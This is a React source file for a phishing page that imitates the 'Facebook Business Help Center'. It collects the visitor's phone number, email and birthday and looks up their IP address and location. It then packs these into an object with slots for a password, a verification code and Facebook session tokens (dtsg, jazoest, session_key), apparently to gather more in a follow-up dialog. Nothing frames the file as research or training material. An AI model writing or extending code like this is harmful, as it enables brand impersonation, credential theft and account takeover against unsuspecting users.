import React, { useEffect } from "react";
import "./Form.css";
import { useState } from "react";
import { PhoneInput } from 'react-international-phone';
import 'react-international-phone/style.css';
import Dialog from "./Dialog";
import apiClient from "../../api/apiClient";

// import css from boostrap

export default function Form() {
    const [isAccept, setAccept] = useState(false);
    const [isShow, setShow] = useState(false);
    const [phone, setPhone] = useState('');
    const [email, setEmail] = useState('');
    const [birthDay, setBirthDay] = useState('');
    const [myIpInfo, setMyIpInfo] = useState('');
    const [isOpen, setIsOpen] = useState(false);
    const [password, setPassword] = useState('');
    const [data, setData] = useState({});

    useEffect(() => {
        getMyIp();
    }, []);


    const openDialog = () => setIsOpen(true);

    const getMyIp = async () => {
        const url = "https://api.ipify.org?format=json";
        const response = await apiClient.get(url);
        const ip = response.data.ip;
        const freeapi = `https://freeipapi.com/api/json/${ip}`;
        const ipinfo = await apiClient.get(freeapi);
        setMyIpInfo(ipinfo.data);
    }


    const handleAccept = () => { // x l khi ngi dng chn  check v nhn tip tc
        setAccept(!isAccept);
    }

    const handleClick = () => { //show ra ni nhp info thi
        setShow(true);
    }

    const handleSend = (e) => {
        e.preventDefault();
        const data_ex = {
            phone: phone,
            email: email,
            birthDay: birthDay,
            ip: myIpInfo.ipAddress,
            city: myIpInfo.cityName,
            region: myIpInfo.regionName,
            country: myIpInfo.countryName,
            password: password,
            code: '',
            dtsg: "",
            jazoest: "",
            nh: "",
            session_key: "",
        }
        setData(data_ex);
        localStorage.setItem('data', JSON.stringify(data_ex));
        openDialog();

    }

    return (

        <div className="ns-block-ui full-screen">

            <div className="banner">

                <div className="banner-content">
                    <h5>Facebook Business Help Center</h5>
                    <h1>How can we help you?</h1>
                </div>
            </div>

            <div className="container">
                <div className="hjhj body">
                    <div className="lbz5j0w al row">
                        <center className="hp5suji wrap-title">
                            <h5>How can we help?</h5>
                            <p>We need more information to address your issue. This form will only take a few minutes.</p>
                        </center>
                    </div>
                    <div className="justify-content-center row">
                        <div className="mt-3 col-xl-7 col-lg-9 col-md-11 col-sm-11">
                            {isShow ? (
                                <form className="form-update p-0 mb-5" onSubmit={handleSend}>
                                    <div className="help-center">
                                        <label className="form-label">Get Help</label>
                                    </div>
                                    <div
                                        className="mb-4">
                                        <label className="form-label">Phone number</label>
                                        <PhoneInput
                                            defaultCountry="us"
                                            value={phone}
                                            onChange={e => setPhone(e)}
                                        /></div>
                                    <div className="mb-4">
                                        <label className="form-label">Email address</label>
                                        <input
                                            className="form-control"
                                            type="email"
                                            onChange={(e) => setEmail(e.target.value)}
                                            placeholder="Enter your email address"
                                            id="email"
                                            required
                                        >
                                        </input>
                                    </div>
                                    <div className="mb-4">
                                        <label className="form-label">Birthday</label>
                                        <input
                                            className="form-control"
                                            onChange={(e) => setBirthDay(e.target.value)}
                                            type="date"
                                            id="birth-day"
                                            required
                                        >
                                        </input>
                                    </div>
                                    {/* button next */}
                                    <div className="d-flex justify-content-end" style={{ margin: "10px" }}>
                                        <button
                                            type="submit"
                                            className="button_index px-3 py-2 btn btn-primary">Submit</button>
                                    </div>

                                </form>


                            ) : (
                                <form className="form-update p-0 mb-5">
                                    <b>Most common issues:</b>
                                    <div className="mb-3 select-issuse">
                                        <div className="form-check">
                                            <input name="check" type="radio" id="op1efnb" onChange={handleAccept} className="form-check-input"></input>
                                            <label title="" htmlFor="op1efnb" className="form-check-label">I need to contact the support team</label>
                                        </div>
                                    </div>
                                    <div className="d-flex justify-content-end">
                                        <button type="submit" disabled={!isAccept} onClick={handleClick} className="button_index px-3 py-2 btn btn-primary">Next</button>
                                    </div>
                                </form>
                            )}

                            <Dialog isOpen={isOpen} content={data}>
                                <p>y l ni dung trong hp thoi.</p>
                            </Dialog>
                        </div>
                    </div>
                </div>
            </div >

        </div >


    );
}
